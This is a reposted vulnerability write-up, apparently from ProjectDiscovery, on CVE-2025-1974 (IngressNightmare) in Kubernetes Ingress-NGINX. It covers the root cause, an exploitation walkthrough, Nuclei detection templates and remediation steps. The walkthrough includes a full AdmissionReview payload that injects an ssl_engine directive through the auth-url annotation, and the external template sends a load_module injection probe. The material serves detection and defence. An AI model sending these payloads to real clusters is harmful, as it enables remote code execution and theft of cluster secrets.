<!DOCTYPE html><html lang=zh><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>18K软件 AI工具 免费资源</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/libs/highlight/styles/18k.css><meta name=generator content="Hexo 7.3.0"></head><body id=bodyx><div class="hd posts"><a href=javascript:history.back() class=replay-btn>返回</a><div class=post-title><p>IngressNightmare Unauth RCE in Ingress NGINX (CVE-2025-1974)</p><hr></div><div class=post-content><h1 id=IngressNightmare-Unauth-RCE-in-Ingress-NGINX-CVE-2025-1974><a href=#IngressNightmare-Unauth-RCE-in-Ingress-NGINX-CVE-2025-1974 class=headerlink title="IngressNightmare: Unauth RCE in Ingress NGINX (CVE-2025-1974)"></a>IngressNightmare: Unauth RCE in Ingress NGINX (CVE-2025-1974)</h1><p><a href=/blog/category/vulnerability-research/1>Vulnerability Research</a><img src=http://www.18k.icu/images/20250625_06_3ng027zq/img_2.jpg alt="IngressNightmare: Unauth RCE in Ingress NGINX (CVE-2025-1974)"></p><h4 id=Share><a href=#Share class=headerlink title=Share></a>Share</h4><p>A critical vulnerability (CVE-2025-1974) was recently discovered in the Kubernetes <strong>Ingress-NGINX Controller</strong> that allows <strong>unauthenticated remote code execution (RCE)</strong> on the ingress controller pod.</p><p>Originally discovered by the <a target=_blank rel=noopener href=https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities>Wiz research</a> team (Nir Ohfeld, Ronen Shustin, Sagi Tzadik, Hillai Ben-Sasson) in late 2024 and disclosed in March 2025, CVE-2025-1974 is part of a series of vulnerabilities collectively called <strong>IngressNightmare</strong>.</p><blockquote><p>If you’re specifically looking to use the IngressNightmare detection templates, feel free to skip ahead to the end of the blog post.</p></blockquote><h2 id=What-is-Ingress-Nginx-Controller><a href=#What-is-Ingress-Nginx-Controller class=headerlink title="What is Ingress-Nginx Controller?"></a>What is Ingress-Nginx Controller?</h2><p><a target=_blank rel=noopener href=https://github.com/kubernetes/ingress-nginx>Ingress-Nginx Controller</a> is one of the most popular ingress controllers available for Kubernetes, and a core Kubernetes project with over 18.1k+ stars on GitHub. It serves as a critical component in the Kubernetes ecosystem, acting as the gateway between external traffic and internal services running within a Kubernetes cluster.</p><h3 id=The-Role-of-Ingress-Controllers-in-Kubernetes><a href=#The-Role-of-Ingress-Controllers-in-Kubernetes class=headerlink title="The Role of Ingress Controllers in Kubernetes"></a>The Role of Ingress Controllers in Kubernetes</h3><p>In Kubernetes, an Ingress is an API object that manages external access to services within a cluster, typically via HTTP&#x2F;HTTPS. However, the Ingress resource itself doesn’t do anything without an Ingress controller - a component that interprets the Ingress resource specifications and configures the actual routing.Ingress-Nginx Controller fulfills this role by implementing the Ingress specification using NGINX, one of the most widely used reverse proxies and load balancers. It’s explicitly highlighted in the Kubernetes documentation as an example Ingress controller that fulfills the prerequisite for using Ingress in Kubernetes.</p><h2 id=Technical-Details-of-the-Vulnerability-CVE-2025-1974><a href=#Technical-Details-of-the-Vulnerability-CVE-2025-1974 class=headerlink title="Technical Details of the Vulnerability (CVE-2025-1974)"></a>Technical Details of the Vulnerability (CVE-2025-1974)</h2><h3 id=The-Admission-Controller-Vulnerability><a href=#The-Admission-Controller-Vulnerability class=headerlink title="The Admission Controller Vulnerability"></a>The Admission Controller Vulnerability</h3><p>CVE-2025-1974 is a critical vulnerability in the Ingress-Nginx Controller that allows for unauthenticated remote code execution. At its core, this vulnerability stems from a design flaw in how the admission controller component processes and validates incoming ingress objects.The admission controller in Ingress-Nginx is designed to validate incoming ingress objects before they are deployed to ensure the resulting NGINX configuration will be valid. By default, these admission controllers are accessible over the network without authentication, making them a highly appealing attack vector.</p><h3 id=The-Vulnerability-Mechanism><a href=#The-Vulnerability-Mechanism class=headerlink title="The Vulnerability Mechanism"></a>The Vulnerability Mechanism</h3><p>When the Ingress-Nginx admission controller processes an incoming ingress object, it constructs an NGINX configuration from it and then validates it using the NGINX binary with the <code>-t</code> flag. Wiz research team found a vulnerability in this phase that allows injecting arbitrary NGINX configuration remotely by sending a malicious ingress object directly to the admission controller through the network.The vulnerability specifically involves the Ingress annotation, which can be exploited to inject configuration into NGINX. Some annotations can be manipulated to inject arbitrary NGINX directives.Let’s examine how this works:</p><ol><li>The admission controller receives an ingress object with a specially crafted <code>auth-url</code> annotation</li><li>When processing this annotation, the controller doesn’t properly sanitize the input</li><li>The malicious annotation value is incorporated into the NGINX configuration</li><li>During validation with <code>nginx -t</code>, the injected configuration causes code execution</li></ol><h3 id=From-Configuration-Injection-to-RCE><a href=#From-Configuration-Injection-to-RCE class=headerlink title="From Configuration Injection to RCE"></a>From Configuration Injection to RCE</h3><p>The progression from configuration injection to remote code execution exploits weaknesses in NGINX’s configuration validation process. Initially, Wiz research team explored the <code>load_module</code> directive, which allows loading shared libraries from the filesystem. However, since this directive can only be used at the start of the NGINX configuration, it was incompatible with the injection point. Further investigation led to the <code>ssl_engine</code> directive, part of the OpenSSL module, which can also load shared libraries. Unlike <code>load_module</code>, <code>ssl_engine</code> can be used anywhere within the configuration file.</p><h3 id=Uploading-a-Shared-Library><a href=#Uploading-a-Shared-Library class=headerlink title="Uploading a Shared Library"></a>Uploading a Shared Library</h3><p>The next challenge in exploiting this vulnerability is placing a shared library on the pod’s filesystem. The research team discovered that the Ingress-Nginx pod also runs the NGINX instance itself, listening on port 80 or 443. By sending a specially crafted HTTP request to this instance, we can leverage NGINX’s client body buffers to upload a malicious shared library to the filesystem.Once the shared library is uploaded and the malicious configuration is injected, the <code>ssl_engine</code> directive loads the library during the validation phase, executing the attacker’s code with the privileges of the Ingress-Nginx controller pod.</p><h3 id=Affected-Versions><a href=#Affected-Versions class=headerlink title="Affected Versions"></a>Affected Versions</h3><p>This vulnerability affects:</p><ul><li>Ingress-Nginx Controller version 1.11.x before 1.11.5</li><li>Ingress-Nginx Controller versions below 1.11.0</li></ul><p>The vulnerability has been fixed in versions 1.12.1 and later, as well as 1.11.5 and later.</p><h2 id=Exploitation-Demonstration><a href=#Exploitation-Demonstration class=headerlink title="Exploitation Demonstration"></a>Exploitation Demonstration</h2><p>This section provides a detailed walkthrough of how CVE-2025-1974 can be exploited in vulnerable Ingress-Nginx Controller deployments. Understanding the exploitation process is crucial for security teams to properly assess their risk and validate their defenses.</p><p>It’s important to note that by default, admission controllers are accessible over the network without authentication, making this attack vector particularly dangerous.</p><h4 id=Step-1-Identify-Vulnerable-Clusters><a href=#Step-1-Identify-Vulnerable-Clusters class=headerlink title="Step 1: Identify Vulnerable Clusters"></a>Step 1: Identify Vulnerable Clusters</h4><p>First, an attacker would identify clusters running vulnerable versions of Ingress-Nginx Controller. This can be done by:bash</p><p>cli</p><p>Copy</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">1kubectl get pods --all-namespaces --selector app.kubernetes.io/name=ingress-nginx<br></code></pre></td></tr></table></figure><p>Then checking the image version to determine if it’s vulnerable (versions prior to 1.11.5 or 1.12.1).</p><h4 id=Step-2-Craft-a-Malicious-Admission-Review-Request><a href=#Step-2-Craft-a-Malicious-Admission-Review-Request class=headerlink title="Step 2: Craft a Malicious Admission Review Request"></a>Step 2: Craft a Malicious Admission Review Request</h4><p>The attacker creates a specially crafted AdmissionReview request that includes an ingress object with the malicious <code>auth-url</code> annotation. Here’s an example of such a request:</p><p>JSON</p><p>Copy</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">1&#123;<br>2  &quot;kind&quot;: &quot;AdmissionReview&quot;,<br>3  &quot;apiVersion&quot;: &quot;admission.k8s.io/v1&quot;,<br>4  &quot;request&quot;: &#123;<br>5    &quot;uid&quot;: &quot;d48aa397-c414-4fb2-a2b0-b28187daf8a5&quot;,<br>6    &quot;kind&quot;: &#123;<br>7      &quot;group&quot;: &quot;networking.k8s.io&quot;,<br>8      &quot;version&quot;: &quot;v1&quot;,<br>9      &quot;kind&quot;: &quot;Ingress&quot;<br>10    &#125;,<br>11    &quot;resource&quot;: &#123;<br>12      &quot;group&quot;: &quot;networking.k8s.io&quot;,<br>13      &quot;version&quot;: &quot;v1&quot;,<br>14      &quot;resource&quot;: &quot;ingresses&quot;<br>15    &#125;,<br>16    &quot;requestKind&quot;: &#123;<br>17      &quot;group&quot;: &quot;networking.k8s.io&quot;,<br>18      &quot;version&quot;: &quot;v1&quot;,<br>19      &quot;kind&quot;: &quot;Ingress&quot;<br>20    &#125;,<br>21    &quot;requestResource&quot;: &#123;<br>22      &quot;group&quot;: &quot;networking.k8s.io&quot;,<br>23      &quot;version&quot;: &quot;v1&quot;,<br>24      &quot;resource&quot;: &quot;ingresses&quot;<br>25    &#125;,<br>26    &quot;name&quot;: &quot;test-ingressxaa&quot;,<br>27    &quot;namespace&quot;: &quot;default&quot;,<br>28    &quot;operation&quot;: &quot;CREATE&quot;,<br>29    &quot;userInfo&quot;: &#123;<br>30<br>31    &#125;,<br>32    &quot;object&quot;: &#123;<br>33      &quot;kind&quot;: &quot;Ingress&quot;,<br>34      &quot;apiVersion&quot;: &quot;networking.k8s.io/v1&quot;,<br>35      &quot;metadata&quot;: &#123;<br>36        &quot;name&quot;: &quot;test-ingressxaa&quot;,<br>37        &quot;namespace&quot;: &quot;default&quot;,<br>38        &quot;creationTimestamp&quot;: null,<br>39        &quot;annotations&quot;: &#123;<br>40          &quot;nginx.ingress.kubernetes.io/rewrite-target&quot;: &quot;/&quot;,<br>41&quot;nginx.ingress.kubernetes.io/auth-url&quot;: &quot;http://example.com#;&#125;&#125;&#125;\nssl_engine /path/to/shared-library.so;events &#123;\nserver &#123; location /aa &#123; #&quot;<br>42        &#125;<br>43      &#125;,<br>44      &quot;spec&quot;: &#123;<br>45        &quot;ingressClassName&quot;: &quot;nginx&quot;,<br>46        &quot;rules&quot;: [<br>47          &#123;<br>48            &quot;host&quot;: &quot;test.local&quot;,<br>49            &quot;http&quot;: &#123;<br>50              &quot;paths&quot;: [<br>51              ]<br>52            &#125;<br>53          &#125;<br>54        ]<br>55      &#125;,<br>56      &quot;status&quot;: &#123;<br>57        &quot;loadBalancer&quot;: &#123;&#125;<br>58      &#125;<br>59    &#125;,<br>60    &quot;oldObject&quot;: null,<br>61    &quot;dryRun&quot;: true,<br>62    &quot;options&quot;: &#123;<br>63      &quot;kind&quot;: &quot;CreateOptions&quot;,<br>64      &quot;apiVersion&quot;: &quot;meta.k8s.io/v1&quot;<br>65    &#125;<br>66  &#125;<br>67&#125;<br></code></pre></td></tr></table></figure><p>The key part of this payload is the <code>auth-url</code> annotation, which contains the NGINX configuration injection.</p><h4 id=Step-3-Upload-a-Malicious-Shared-Library><a href=#Step-3-Upload-a-Malicious-Shared-Library class=headerlink title="Step 3: Upload a Malicious Shared Library"></a>Step 3: Upload a Malicious Shared Library</h4><p>In parallel, the attacker needs to upload a malicious shared library to the pod’s filesystem. This can be done by sending a specially crafted HTTP request to the NGINX instance running in the same pod:</p><ol><li>Create a malicious shared library (.so file) that contains the code to be executed</li><li>Send a large HTTP POST request to the NGINX instance</li><li>The request body will be buffered to disk due to its size</li><li>The attacker can then reference this file using the <code>ssl_engine</code> directive</li></ol><h4 id=Step-4-Execute-the-Payload><a href=#Step-4-Execute-the-Payload class=headerlink title="Step 4: Execute the Payload"></a>Step 4: Execute the Payload</h4><p>When the admission controller processes the malicious ingress object, it will:</p><ol><li>Generate an NGINX configuration that includes the injected directives</li><li>Validate the configuration using <code>nginx -t</code></li><li>During validation, the <code>ssl_engine</code> directive will load the malicious shared library</li><li>The code in the shared library will execute with the privileges of the Ingress-Nginx controller pod</li></ol><h2 id=Nuclei-Templates-for-IngressNightmare-Detection><a href=#Nuclei-Templates-for-IngressNightmare-Detection class=headerlink title="Nuclei Templates for IngressNightmare Detection"></a>Nuclei Templates for IngressNightmare Detection</h2><p>To help security teams identify vulnerable Ingress-Nginx Controller deployments in their environments, we’ve write Nuclei templates for both external and internal testing. These templates can be used to detect the presence of CVE-2025-1974 in your Kubernetes clusters.</p><h3 id=Vulnerable-Exposed-Admission-Controller-Template><a href=#Vulnerable-Exposed-Admission-Controller-Template class=headerlink title="Vulnerable Exposed Admission Controller Template"></a>Vulnerable Exposed Admission Controller Template</h3><p>This template is designed to detect vulnerable <code>Ingress-Nginx</code> admission controllers that are exposed to the internet. It works by sending a crafted admission review request and analyzing the response.</p><p><strong>Nuclei Template to detect</strong> CVE-2025-1974 <strong>-</strong> <a target=_blank rel=noopener href=https://cloud.projectdiscovery.io/public/CVE-2025-1974><strong>CVE Scan URL</strong></a></p><p>cli</p><p>Copy</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">1id: CVE-2025-1974<br>2<br>3info:<br>4  name: Ingress-Nginx Controller - Remote Code Execution<br>5  author: iamnoooob,rootxharsh,pdresearch<br>6  severity: critical<br>7  description: |<br>8    A security issue was discovered in ingress-nginx where the `auth-tls-match-cn` Ingress annotation can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller<br>9  impact: |<br>10    Vulnerable versions of Ingress-Nginx controller can be exploited to gain unauthorized access to all secrets across namespaces in the Kubernetes cluster, potentially leading to complete cluster takeover.<br>11  remediation: |<br>12    Update to one of the following versions: Version 1.12.1 or later / Version 1.11.5 or later<br>13  reference:<br>14    - https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities<br>15    - https://projectdiscovery.io/blog/ingressnightmare-unauth-rce-in-ingress-nginx<br>16    - https://nvd.nist.gov/vuln/detail/CVE-2025-1974<br>17  classification:<br>18    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H<br>19    cvss-score: 9.8<br>20    cwe-id: CWE-653<br>21    cve-id: CVE-2025-1974<br>22  metadata:<br>23    verified: true<br>24    max-request: 1<br>25    shodan-query: ssl:&quot;ingress-nginx&quot; port:8443<br>26  tags: cve,cve2025,cloud,devops,kubernetes,ingress,nginx,k8s<br>27<br>28http:<br>29  - raw:<br>30      - |<br>31        POST / HTTP/1.1<br>32        Host: &#123;&#123;Hostname&#125;&#125;<br>33        Content-Type: application/json<br>34<br>35        &#123;<br>36          &quot;kind&quot;: &quot;AdmissionReview&quot;,<br>37          &quot;apiVersion&quot;: &quot;admission.k8s.io/v1&quot;,<br>38          &quot;request&quot;: &#123;<br>39            &quot;uid&quot;: &quot;d48aa397-c414-4fb2-a2b0-b28187daf8a6&quot;,<br>40            &quot;kind&quot;: &#123;<br>41              &quot;group&quot;: &quot;networking.k8s.io&quot;,<br>42              &quot;version&quot;: &quot;v1&quot;,<br>43              &quot;kind&quot;: &quot;Ingress&quot;<br>44            &#125;,<br>45            &quot;resource&quot;: &#123;<br>46              &quot;group&quot;: &quot;networking.k8s.io&quot;,<br>47              &quot;version&quot;: &quot;v1&quot;,<br>48              &quot;resource&quot;: &quot;ingresses&quot;<br>49            &#125;,<br>50            &quot;requestKind&quot;: &#123;<br>51              &quot;group&quot;: &quot;networking.k8s.io&quot;,<br>52              &quot;version&quot;: &quot;v1&quot;,<br>53              &quot;kind&quot;: &quot;Ingress&quot;<br>54            &#125;,<br>55            &quot;requestResource&quot;: &#123;<br>56              &quot;group&quot;: &quot;networking.k8s.io&quot;,<br>57              &quot;version&quot;: &quot;v1&quot;,<br>58              &quot;resource&quot;: &quot;ingresses&quot;<br>59            &#125;,<br>60            &quot;name&quot;: &quot;test-&#123;&#123;randstr&#125;&#125;&quot;,<br>61            &quot;namespace&quot;: &quot;default&quot;,<br>62            &quot;operation&quot;: &quot;CREATE&quot;,<br>63            &quot;userInfo&quot;: &#123;<br>64<br>65            &#125;,<br>66            &quot;object&quot;: &#123;<br>67              &quot;kind&quot;: &quot;Ingress&quot;,<br>68              &quot;apiVersion&quot;: &quot;networking.k8s.io/v1&quot;,<br>69              &quot;metadata&quot;: &#123;<br>70                &quot;name&quot;: &quot;test-&#123;&#123;randstr&#125;&#125;&quot;,<br>71                &quot;namespace&quot;: &quot;default&quot;,<br>72                &quot;creationTimestamp&quot;: null,<br>73                &quot;annotations&quot;: &#123;<br>74        &quot;nginx.ingress.kubernetes.io/auth-url&quot;: &quot;http://example.com#;load_module test;\n&quot;<br>75                &#125;<br>76              &#125;,<br>77              &quot;spec&quot;: &#123;<br>78                &quot;ingressClassName&quot;: &quot;nginx&quot;,<br>79                &quot;rules&quot;: [<br>80                  &#123;<br>81                    &quot;host&quot;: &quot;&#123;&#123;randstr&#125;&#125;&quot;,<br>82                    &quot;http&quot;: &#123;<br>83                      &quot;paths&quot;: [<br>84                      ]<br>85                    &#125;<br>86                  &#125;<br>87                ]<br>88              &#125;,<br>89              &quot;status&quot;: &#123;<br>90                &quot;loadBalancer&quot;: &#123;&#125;<br>91              &#125;<br>92            &#125;,<br>93            &quot;oldObject&quot;: null,<br>94            &quot;dryRun&quot;: true,<br>95            &quot;options&quot;: &#123;<br>96              &quot;kind&quot;: &quot;CreateOptions&quot;,<br>97              &quot;apiVersion&quot;: &quot;meta.k8s.io/v1&quot;<br>98            &#125;<br>99          &#125;<br>100        &#125;<br>101<br>102    matchers:<br>103      - type: word<br>104        part: body<br>105        words:<br>106          - &#x27;AdmissionReview&#x27;<br>107          - &#x27;directive is not allowed here&#x27;<br>108          - &#x27;load_module&#x27;<br>109        condition: and<br></code></pre></td></tr></table></figure><p>cli</p><p>Copy</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">1pwnmachine@PD ~ % nuclei -t CVE-2025-1974.yaml -u &quot;https://&lt;redacted&gt;:8443&quot;<br>2                     __     _<br>3   ____  __  _______/ /__  (_)<br>4  / __ \/ / / / ___/ / _ \/ /<br>5 / / / / /_/ / /__/ /  __/ /<br>6/_/ /_/\__,_/\___/_/\___/_/   v3.3.10<br>7<br>8		projectdiscovery.io<br>9<br>10[INF] Current nuclei version: v3.3.10 (latest)<br>11[INF] Current nuclei-templates version: v10.1.5 (latest)<br>12[WRN] Scan results upload to cloud is disabled.<br>13[INF] New templates added in latest release: 281<br>14[INF] Templates loaded for current scan: 1<br>15[WRN] Loading 1 unsigned templates for scan. Use with caution.<br>16[INF] Targets loaded for current scan: 1<br>17<br>18[CVE-2025-1974] [http] [critical] https://&lt;redacted&gt;:8443<br></code></pre></td></tr></table></figure><p><strong>Template Breakdown:</strong></p><p>Sending a POST request to the target host with a specially crafted AdmissionReview JSON payload</p><ol><li>The payload includes an ingress object with a malicious annotation that attempts to inject a <code>load_module</code> directive that tries to load a random file on the filesystem.</li><li>If the target is a vulnerable Ingress-Nginx admission controller, it will process the request and return an error message indicating that the “DSO support routines:: could not load the shared library”, along side some other error messages which are then matched by the template for detection.</li></ol><p>This template is particularly useful for identifying externally exposed admission controllers that could be targeted by attackers.</p><h3 id=Internal-Kubernetes-Cluster-Template><a href=#Internal-Kubernetes-Cluster-Template class=headerlink title="Internal Kubernetes Cluster Template"></a>Internal Kubernetes Cluster Template</h3><p>The following template is to be run from within a Kubernetes cluster. This can come in handy along with other Kubernetes Cluster Security templates during Kubernetes configuration review engagements.</p><p>It checks for vulnerable versions of the Ingress-Nginx controller by examining the container images used in the deployment.</p><p>cli</p><p>Copy</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">1id: CVE-2025-1974-k8s<br>2<br>3info:<br>4  name: Ingress-Nginx Controller - Unauthenticated Remote Code Execution<br>5  author: princechaddha<br>6  severity: critical<br>7  description: A security issue was discovered in ingress-nginx where some Ingress annotations can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller<br>8  impact: |<br>9    Vulnerable versions of Ingress-Nginx controller can be exploited to gain unauthorized access to all secrets across namespaces in the Kubernetes cluster, potentially leading to complete cluster takeover.<br>10  remediation: |<br>11    Update to one of the following versions: Version 1.12.1 or later / Version 1.11.5 or later<br>12  reference:<br>13    - https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities<br>14    - <br>15  tags: cve,cve2025,cloud,devops,kubernetes,ingress,nginx,k8s,k8s-cluster-security<br>16<br>17flow: |<br>18  code(1) ;<br>19  for (let pod of template.items) &#123;<br>20    set(&quot;pod&quot;, pod)<br>21    javascript(1);<br>22  &#125;<br>23<br>24self-contained: true<br>25code:<br>26  - engine:<br>27      - sh<br>28      - bash<br>29    source: kubectl get pods -n ingress-nginx -l app.kubernetes.io/component=controller -o json<br>30    extractors:<br>31      - type: json<br>32        name: items<br>33        internal: true<br>34        json:<br>35          - &#x27;.items[]&#x27;<br>36<br>37javascript:<br>38  - code: |<br>39        let podData = JSON.parse(template.pod);<br>40<br>41        const container = podData.spec.containers.find(c =&gt; c.name === &#x27;controller&#x27;);<br>42        if (container &amp;&amp; container.image) &#123;<br>43          const imageTag = container.image.split(&#x27;:&#x27;)[1];<br>44          if (imageTag) &#123;<br>45            const version = imageTag.split(&#x27;@&#x27;)[0].replace(/^v/, &#x27;&#x27;);<br>46            const [major, minor, patch] = version.split(&#x27;.&#x27;).map(v =&gt; parseInt(v, 10));<br>47<br>48            if ((major === 1 &amp;&amp; minor === 11 &amp;&amp; patch &lt; 5) ||<br>49                (major === 1 &amp;&amp; minor === 12 &amp;&amp; patch === 0) ||<br>50                (major === 1 &amp;&amp; minor &lt; 11) ||<br>51                (major === 1 &amp;&amp; minor === 9 &amp;&amp; patch &lt;= 3)) &#123;<br>52              let result = (`Ingress-Nginx controller in namespace &#x27;$&#123;podData.metadata.namespace&#125;&#x27; is running vulnerable version $&#123;version&#125;. Update to v1.12.1+ or v1.11.5+`);<br>53              Export(result);<br>54            &#125;<br>55          &#125;<br>56        &#125;<br>57<br>58    extractors:<br>59      - type: dsl<br>60        dsl:<br>61          - response<br></code></pre></td></tr></table></figure><p>cli</p><p>Copy</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">1pwnmachine@PD ~ % nuclei -t CVE-2025-1974-k8s.yaml -code<br>2<br>3                     __     _<br>4   ____  __  _______/ /__  (_)<br>5  / __ \/ / / / ___/ / _ \/ /<br>6 / / / / /_/ / /__/ /  __/ /<br>7/_/ /_/\__,_/\___/_/\___/_/   v3.3.10<br>8<br>9		projectdiscovery.io<br>10<br>11[INF] Current nuclei version: v3.3.10 (latest)<br>12[INF] Current nuclei-templates version: v10.1.5 (latest)<br>13[WRN] Scan results upload to cloud is disabled.<br>14[INF] New templates added in latest release: 0<br>15[INF] Templates loaded for current scan: 1<br>16[INF] Executing 1 signed templates from a<br>17<br>18[CVE-2025-1974-k8s] [javascript] [critical]  [&quot;Ingress-Nginx controller in namespace &#x27;ingress-nginx&#x27; is running vulnerable version 1.9.3. Update to v1.12.1+ or v1.11.5+&quot;]<br></code></pre></td></tr></table></figure><p><strong>Template Breakdown:</strong></p><ol><li>Using <code>kubectl</code> to get all pods in the <code>ingress-nginx</code> namespace with the label <code>app.kubernetes.io/component=controller</code></li><li>For each pod found, it extracts the container image version</li><li>It then parses the version number and checks if it matches any of the vulnerable version patterns</li><li>If a vulnerable version is detected, it reports the finding with details about the affected namespace and version</li></ol><p>This template is particularly useful for security teams conducting internal audits of their Kubernetes environments.</p><blockquote><p>You can check out the blog below if you’d like to learn more about the above template along with our other Kubernetes cluster security templates.</p></blockquote><p><a target=_blank rel=noopener href=https://projectdiscovery.io/blog/kubernetes>Kubernetes Cluster Security - Nuclei Templates v9.9.0 🎉 — ProjectDiscovery BlogWe’re excited to tell you about Nuclei Templates release v9.9.0! This new version includes newly added Kubernetes Cluster Security templates. In this blog post, we’ll discuss automating Kubernetes security review, creating custom k8s security checks, and sharing results on the PDCP Cloud for review. Kubernetes is often discussed for its complexity and steep learning curve. Its challenging nature has made it a frequent topic for memes in the developer community Hence, we’ve opted to simplify thProjectDiscoveryPrince Chaddha<img src=http://www.18k.icu/images/20250625_06_3ng027zq/img_7.jpg></a></p><p>To use these templates with Nuclei:</p><ul><li>Run the external template against potentially exposed admission controllers:</li></ul><p>cli</p><p>Copy</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">1nuclei -t CVE-2025-1974.yaml -u https://admission-controller-endpoint<br></code></pre></td></tr></table></figure><ul><li>To run the internal template we need to install <code>kubectl</code> and configure its contexts or specific access permissions. We need to sign the template before running it, as it’s a code-based template and requires signing to prevent the execution of untrusted external code.</li></ul><p>cli</p><p>Copy</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">1nuclei -id CVE-2025-1974-k8s.yaml -sign<br>2nuclei -id CVE-2025-1974-k8s.yaml -code<br></code></pre></td></tr></table></figure><p>It’s important to note that the internal template requires <code>kubectl</code> access to your cluster with appropriate permissions, while the external template can be run from anywhere with network access to the target.</p><h3 id=Remediation-Recommendations><a href=#Remediation-Recommendations class=headerlink title="Remediation Recommendations"></a>Remediation Recommendations</h3><p>We strongly recommend the following actions to mitigate the risk of this vulnerability:</p><ol><li><strong>Update Immediately</strong>: Upgrade to Ingress-Nginx Controller version 1.12.1 or later, or version 1.11.5 or later. This is the most effective way to address the vulnerability.</li><li><strong>Network Policies</strong>: Implement strict network policies to ensure that only the Kubernetes API Server can access the admission controller.</li></ol><h3 id=Timeline><a href=#Timeline class=headerlink title=Timeline:></a>Timeline:</h3><ul><li><strong>December 31, 2024:</strong> Vulnerability (CVE-2025-1974) initially reported privately to Kubernetes security team by Wiz Research.</li><li><strong>March 24, 2025:</strong> Public disclosure and detailed advisory published by Kubernetes and Wiz Research. Patched versions (1.12.1 and 1.11.5) released.</li><li><strong>March 25, 2025:</strong> The Nuclei templates for internal detection were published by the ProjectDiscovery Team.</li><li><strong>March 26, 2025</strong>: The Nuclei templates for external detection were published by the ProjectDiscovery Team.</li></ul></div></div><div class=footer id=footer><p>Copyright © 2025 <a class=flink target=_blank rel=noopener href=http://www.18k.icu>www.18k.icu</a> <label class="el-switch el-switch-green el-switch-sm" style=vertical-align:sub><input type=checkbox name=switch id=update_style> <span class=el-switch-style></span></label></p></div><input type=hidden id=web_style value=black> <input type=hidden id=valine_appid value=CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz> <input type=hidden id=valine_appKey value=FqiyUqbg7McKN2eG0MCewupf><script src=https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js></script><script src=/libs/highlight/highlight.pack.js></script><script src=/js/js.js></script><style>.v *{color:#698fca}.v .vlist .vcard .vhead .vsys{color:#3a3e4a}.v .vlist .vcard .vh .vmeta .vat{color:#638fd5}.v .vlist .vcard .vhead .vnick{color:#6ba1ff}.v a{color:#8696b1}.v .vlist .vcard .vhead .vnick:hover{color:#669bfc}</style><script>var _hmt=_hmt||[];(()=>{var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?eb7eb8199824646269cd262b46a87950",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)})()</script></body></html>